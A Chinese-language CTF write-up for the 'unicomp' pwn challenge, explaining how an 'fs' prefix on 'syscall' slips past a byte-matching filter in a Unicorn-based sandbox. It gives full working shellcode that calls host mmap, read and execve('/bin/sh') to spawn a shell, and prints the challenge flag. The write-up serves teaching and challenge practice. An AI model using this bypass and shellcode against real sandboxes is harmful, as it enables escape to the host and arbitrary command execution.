# unicomp

## 题目简述

题目实现了一个基于 Unicorn x86-64 模拟器的“用户态 seccomp”。选手提交十六进制 shellcode，程序把它映射到固定的可执行区域并开始模拟。每执行一条指令，`UC_HOOK_CODE` 回调都会读取该指令的完整字节；只有字节严格等于 `0f 05` 时才把它视为 `syscall`，并且只允许系统调用号 `60`（`exit`）。与此同时，另一个 `UC_HOOK_INSN` 回调会把模拟寄存器中的参数原样传给宿主进程的 `libc.syscall`：

```python
def emu_syscall(mu, _user_data):
    ret = libc.syscall(
        mu.reg_read(UC_X86_REG_RAX),
        mu.reg_read(UC_X86_REG_RDI),
        mu.reg_read(UC_X86_REG_RSI),
        mu.reg_read(UC_X86_REG_RDX),
        mu.reg_read(UC_X86_REG_R10),
        mu.reg_read(UC_X86_REG_R8),
        mu.reg_read(UC_X86_REG_R9),
    )
    mu.reg_write(UC_X86_REG_RAX, ret)

def chk_syscall(mu, addr, size, _user_data):
    insn = mu.mem_read(addr, size)
    if insn == bytearray(b'\x0f\x05'):
        if mu.reg_read(UC_X86_REG_RAX) != 60:
            mu.emu_stop()
```

漏洞是过滤器比较了某一种**编码字节串**，而不是比较解码后的指令语义。x86-64 指令可以带有对其语义无影响的冗余前缀；把 FS 段覆盖前缀 `0x64` 放在 `syscall` 前，完整编码变成 `64 0f 05`，字节比较不再命中，但 Unicorn 仍将其识别为 `UC_X86_INS_SYSCALL` 并调用宿主系统调用回调。决定性障碍是突破执行边界，因此归入 `pwn`。

## 解题过程

### 绕过系统调用检查

把所有不被允许的系统调用写成：

```asm
fs syscall
```

`chk_syscall` 看到的是三字节 `64 0f 05`，不会进入只允许 `exit` 的分支；`UC_HOOK_INSN` 却按 `syscall` 语义触发 `emu_syscall`。这样即可在宿主 Python 进程中调用任意 Linux 系统调用。

还有一个容易忽略的边界：Unicorn 的模拟内存不是可以直接交给宿主内核解引用的普通进程地址。官方解法因此先通过宿主 `mmap` 在固定地址 `0x77770000` 建立真实映射，再让宿主 `read` 把 `/bin/sh\0` 写入该页，最后把同一真实地址传给宿主 `execve`。

完整 shellcode 如下：

```asm
; mmap(0x77770000, 0x1000,
;      PROT_READ | PROT_WRITE | PROT_EXEC,
;      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
xor r9d, r9d
mov r8, -1
mov r10, 0x22
mov edx, 7
mov esi, 0x1000
mov edi, 0x77770000
mov eax, 9
fs syscall

; read(0, mapped_page, 8)
mov edx, 8
mov rsi, rax
xor edi, edi
xor eax, eax
fs syscall

; execve("/bin/sh", NULL, NULL)
xor edx, edx
xor esi, esi
mov edi, 0x77770000
mov eax, 59
fs syscall

; 若 execve 失败则正常退出
xor edi, edi
mov eax, 60
syscall
```

发送汇编后的 shellcode 十六进制串，随后再发送八字节 `/bin/sh\0`。成功的 `execve` 会用 shell 替换当前服务进程，此时读取容器中的 `/flag-*.txt` 即可。仓库官方 `solution/solve.py` 完整实现了该交互，`task.yml` 记录的验证 flag 为：

```text
CakeCTF{x86-64_a1l0ws_1ns7ruct10n_t0_b3_inf1nit3Ly_l0ng}
```

## 方法总结

- 核心技巧：给 `syscall` 添加无效于语义、却改变完整字节序列的 x86 前缀，使解码器和手写字节过滤器产生差异。
- 识别信号：安全检查把 `mu.mem_read(addr, size)` 的结果与固定 opcode 做全等比较，而真正执行逻辑依据解码后的 `UC_X86_INS_SYSCALL` 触发。
- 复用要点：指令过滤应基于规范化后的语义，而不是单一编码；审计模拟器时还要区分 guest 内存与 host 内存。若回调直接调用宿主内核，先用宿主 `mmap` 建立可被后续系统调用解引用的真实地址。
